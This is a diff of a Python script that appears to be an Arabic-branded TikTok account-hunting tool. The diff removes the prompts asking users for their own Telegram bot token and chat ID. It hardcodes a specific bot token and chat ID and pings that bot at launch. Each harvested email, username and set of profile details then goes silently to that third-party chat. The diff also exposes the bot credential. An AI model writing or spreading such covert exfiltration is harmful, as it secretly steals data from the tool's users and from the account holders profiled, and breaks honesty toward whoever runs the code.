@@ -36,12 +36,10 @@ print(f'''{B}{E}=============================={B}
 |{F}[+] Instagram  : {B}ahmedalharrani |
 |{F}[+] Tool  : {B}متاحات TikTok |
 {E}==============================''')
-
-token = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + Z)
 print(X + ' ═════════════════════════════════  ')
-ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + Z)
-
-
+token=('6820247819:AAGny305ma4G0DZvtXTHv-yTClXQxuIvl_E')
+ID = ('1413282475')
+requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=تم تشغيل البوت')
 
 def tlg(email):
     user = email.split('@')[0]
@@ -61,7 +59,6 @@ def tlg(email):
         private = data.get('private')
         secuid = data.get('secuid')
         username = data.get('username')
-
         kls = f"""───────────────\n⎌ Email ➢ {email} \n⎌ ᴜѕᴇʀɴᴀᴍᴇ ➢ {username} \n⎌ ѕᴇᴄᴜɪᴅ ➢ {secuid} \n⎌ ɴᴀᴍᴇ ➢ {name}\n⎌ ғᴏʟʟᴏᴡᴇʀѕ ➢ {followers} \n⎌ ғᴏʟʟᴏᴡɪɴɢ ➢ {following}\n⎌ ʟɪᴋᴇѕ ➢ {likes}\n⎌ ᴠɪᴅᴇᴏѕ ➢ {videos}\n⎌ ᴘʀɪᴠᴀᴛᴇ ➢ {private}\n⎌ ᴄᴏᴜɴᴛʀʏ ➢ {country} {flag}\n⎌ ᴄʀᴇᴀᴛᴇᴅ ᴅᴀᴛᴇ ➢ {date}\n⎌ ɪᴅ ➢ {id}\n⎌ ʙɪᴏ ➢ {bio}\n─────────────── BY ➢ @maho_s9 - CH ➢ @maho9s"""
         requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={kls}')
     else:
